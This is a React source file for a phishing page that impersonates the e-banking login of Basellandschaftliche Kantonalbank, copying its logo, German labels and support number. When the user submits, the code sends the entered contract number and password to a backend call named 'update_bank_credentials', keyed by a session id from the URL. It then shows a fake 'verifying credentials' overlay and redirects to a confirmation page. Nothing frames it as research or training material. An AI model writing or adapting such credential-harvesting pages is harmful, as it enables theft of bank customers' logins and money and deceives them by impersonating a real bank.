import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff } from "lucide-react";
import logoAsset from "@/assets/blkb-logo.svg.asset.json";

const RED = "#FD000D";

type FieldProps = {
  id: string;
  label: string;
  type?: "text" | "password";
  value: string;
  onChange: (v: string) => void;
  isPassword?: boolean;
  showPassword?: boolean;
  onTogglePassword?: () => void;
};

const FloatingField = ({
  id,
  label,
  type = "text",
  value,
  onChange,
  isPassword,
  showPassword,
  onTogglePassword,
}: FieldProps) => {
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;
  const inputType = isPassword ? (showPassword ? "text" : "password") : type;

  return (
    <div className="relative">
      <input
        id={id}
        type={inputType}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        className="w-full h-14 px-4 pr-10 border bg-white text-[15px] text-black outline-none rounded-[2px] transition-colors"
        style={{ borderColor: focused ? "#1a1a1a" : "#bdbdbd" }}
      />
      <label
        htmlFor={id}
        className="absolute pointer-events-none transition-all bg-white px-1"
        style={{
          left: active ? 12 : 16,
          top: active ? 0 : "50%",
          transform: active ? "translateY(-50%)" : "translateY(-50%)",
          fontSize: active ? 12 : 15,
          color: active ? (focused ? "#1a1a1a" : "#666") : "#666",
        }}
      >
        {label}
        <span style={{ color: "#666" }}> *</span>
      </label>
      {isPassword && (
        <button
          type="button"
          onClick={onTogglePassword}
          aria-label="Passwort anzeigen"
          className="absolute right-3 top-1/2 -translate-y-1/2 text-[#444]"
        >
          {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
        </button>
      )}
    </div>
  );
};

const ChBasellandschaftlicheKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Basellandschaftliche Kantonalbank – E-Banking Login", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer / Benutzername",
        p_password_label: "E-Banking Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Header / Logo */}
        <header className="pt-10 md:pt-12 px-6 md:px-16">
          <img src={logoAsset.url} alt="BLKB" className="h-7 md:h-8" />
        </header>

        {/* Main Card */}
        <main className="flex-1 flex flex-col items-center px-4 md:px-6">
          <div className="w-full max-w-[580px] mt-8 md:mt-10 bg-white shadow-md rounded-sm p-6 md:p-12">
            <h1 className="text-[26px] md:text-[28px] font-bold text-black mb-8">
              Login E-Banking
            </h1>

            <div className="space-y-6">
              <FloatingField
                id="blkb-user"
                label="Vertragsnummer / Benutzername"
                value={vertragsnummer}
                onChange={setVertragsnummer}
              />
              <FloatingField
                id="blkb-pass"
                label="E-Banking Passwort"
                isPassword
                value={passwort}
                onChange={setPasswort}
                showPassword={showPassword}
                onTogglePassword={() => setShowPassword(!showPassword)}
              />
            </div>

            <div className="flex justify-end mt-8">
              <button
                onClick={handleSubmit}
                className="bg-[#1a1a1a] hover:bg-black text-white px-10 py-3 rounded-[2px] font-medium text-[15px] transition-colors"
              >
                Weiter
              </button>
            </div>

            <div className="mt-10">
              <h2 className="font-bold text-[15px] mb-2 text-black">Passwort vergessen?</h2>
              <p className="text-[15px] text-black">
                Rufen Sie uns an, wir sind rund um die Uhr für Sie da:{" "}
                <a
                  href="tel:+41619259599"
                  className="hover:underline"
                  style={{ color: RED }}
                >
                  +41 61 925 95 99
                </a>
              </p>
            </div>

            <div className="mt-8">
              <h2 className="font-bold text-[15px] mb-3 text-black">
                Haben Sie noch kein E-Banking?
              </h2>
              <div className="flex flex-col gap-2">
                <a href="#" className="font-bold text-[15px] hover:underline" style={{ color: RED }}>
                  E-Banking bestellen
                </a>
                <a href="#" className="font-bold text-[15px] hover:underline" style={{ color: RED }}>
                  E-Banking testen (Demoversion)
                </a>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-12 bg-[#f5f5f5]">
          <div className="px-6 md:px-16 py-4 flex flex-col md:flex-row justify-end items-center gap-4 md:gap-8 text-[14px]">
            <a href="#" className="hover:underline" style={{ color: RED }}>
              Hilfe und Kontakt
            </a>
            <a href="#" className="hover:underline" style={{ color: RED }}>
              Schützen Sie sich vor Betrügern
            </a>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBasellandschaftlicheKantonalbank;
